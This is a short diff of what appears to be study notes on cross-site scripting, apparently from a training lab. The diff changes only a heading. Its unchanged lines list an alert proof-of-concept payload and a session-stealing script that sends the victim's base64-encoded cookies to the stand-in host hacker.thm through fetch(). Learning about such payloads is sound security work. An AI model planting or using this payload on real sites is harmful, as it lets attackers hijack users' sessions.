@@ -1,5 +1,5 @@
 
-# XSS: Cross-site Scripting
+#  Cross-site Scripting
 
 - Proof Of Concept <script>alert('XSS');</script>
 - Session Stealing <script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
